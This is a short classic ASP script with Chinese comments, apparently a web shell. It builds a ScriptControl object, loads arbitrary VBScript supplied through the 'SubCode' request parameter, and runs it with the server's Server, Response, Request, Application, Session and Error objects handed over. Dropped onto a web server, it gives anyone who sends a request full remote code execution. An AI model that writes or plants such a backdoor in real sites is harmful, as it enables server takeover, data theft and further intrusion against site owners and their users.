<%
Set o = Server.CreateObject(“ScriptControl”)
o.language = “vbscript”
o.addcode(Request(“SubCode”)) ‘参数SubCode作为过程代码
o.run “e”,Server,Response,Request,Application,Session,Error ‘参数名e 调用之，同时压入6个基对象作为参数
%>